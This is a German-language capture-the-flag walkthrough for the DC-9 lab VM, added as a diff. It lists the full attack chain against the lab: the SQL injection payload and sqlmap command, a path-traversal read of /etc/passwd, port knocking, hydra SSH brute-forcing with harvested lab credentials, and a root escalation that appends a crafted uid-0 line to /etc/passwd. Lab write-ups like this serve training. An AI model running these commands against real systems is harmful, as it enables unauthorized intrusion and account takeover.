@@ -1,0 +1,113 @@
+DC-9
+======================================
+
+- nmap: 80/tcp  open     http        Apache httpd 2.4.38 ((Debian))
+- http://<IP>/search.php 
+  => Search Records - SQLi ([M' or '1'='1])
+- sqlmap -u "http://<IP>/results.php" --data "search=M' or '1'='1" -p "search" --method POST
+  => DB Staff, Tabelle Users: admin/856f5de590ef37314e7c3bdf6f8a66dc
+     => "transorbital1" (crackstation.net)
+  => DB users, Tabelle UserDetails
+     => username:password in ssh.txt abspeichern
+---------------------------------------     
+marym:3kfs86sfd
+julied:468sfdfsd2
+fredf:4sfd87sfd1
+barneyr:RocksOff
+tomc:TC&TheBoyz
+jerrym:B8m#48sd
+wilmaf:Pebbles
+bettyr:BamBam01
+chandlerb:UrAG0D!
+joeyt:Passw0rd
+rachelg:yN72#dsd
+rossg:LoveRachel
+monicag:3248dsds7s
+phoebeb:smellycats
+scoots:R3BVxxxw87
+janitor:Ilovepeepee
+janitor2:Hawaii-Five-0
+--------------------------------------- 
+
+- Login auf Homepage als admin (pwd sh. oben)
+  => Fehlermeldung "File does not exist"
+  => manage.php?file=../../../../../../../etc/passwd LFI
+  => /etc/knockd.conf
+       sequence=7469,8475,9842
+  => nc
+- nmap -p 22 
+  => Port 22 ist jetzt offen
+- hydra -s 22 -v -V -C ssh.txt -t 8 <IP> ssh
+  => "janitor"/"Ilovepeepee"
+- SSH janitor
+    => cat .secrets-for-putin/passwords-found-on-post-it-notes.txt
+    => Speichern als pass.txt
+-------------------------------------------
+BamBam01
+Passw0rd
+smellycats
+P0Lic#10-4
+B4-Tru3-001
+4uGU5T-NiGHts
+--------------------------------------------
+- ls /home/ und Benutzer speichern als users.txt
+--------------------------------------------
+root
+admin
+barneyr
+bettyr
+chandlerb
+fredf
+janitor
+janitor2
+jerrym
+joeyt
+julied
+marym
+monicag
+phoebeb
+rachelg
+rossg
+scoots
+tomc
+wilmaf
+----------------------------------------------
+- hydra -s 22 -v -V -L users.txt -P pass.txt -t 8 <IP> ssh
+ => "fredf"/"B4-Tru3-001"
+- SSH fredf
+    => sudo -l
+  (root) NOPASSWD: /opt/devstuff/dist/test/test
+- sudo /opt/devstuff/dist/test/test
+Usage: python test.py read append
+- test.py
+---------------------------------------------
+#!/usr/bin/python
+
+import sys
+
+if len (sys.argv) != 3 :
+    print ("Usage: python test.py read append")
+    sys.exit (1)
+
+else :
+    f = open(sys.argv[1], "r")
+    output = (f.read())
+
+    f = open(sys.argv[2], "a")
+    f.write(output)
+    f.close()
+-----------------------------------------------
+
+- openssl passwd -1 ("hugo")
+   [$1$lkffRZrH$Y1U2u/kKBqv0B11eSZAC./]
+- neue Datei /tmp/hugo.txt:
+     "hugo:$1$lkffRZrH$Y1U2u/kKBqv0B11eSZAC./:0:0:hugo:/tmp:/bin/bash"
+- sudo /opt/devstuff/dist/test/test /tmp/hugo.txt /etc/passwd
+- ssh hugo/hugo
+- cat /root/theflag.txt
+
+
+
+
+
+
